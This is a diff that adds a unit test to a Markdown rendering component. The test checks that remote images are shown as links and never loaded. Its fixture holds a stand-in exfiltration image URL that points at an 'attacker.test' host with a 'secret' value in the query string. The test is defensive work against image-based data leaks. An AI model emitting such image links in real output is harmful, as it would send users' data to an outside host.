@@ -136,3 +136,14 @@ c &amp; d
     expect(markup).not.toContain('<pre><div')
   })
 })
+
+describe('Markdown images', () => {
+  it('renders remote images as links instead of loading them', () => {
+    const markup = renderToStaticMarkup(<Markdown content={'![chart](https://attacker.test/p.png?d=secret) ![](https://x.test/q.gif)'} />)
+
+    expect(markup).not.toContain('<img')
+    expect(markup).toContain('href="https://attacker.test/p.png?d=secret"')
+    expect(markup).toContain('attacker.test')
+    expect(markup).toContain('chart')
+  })
+})
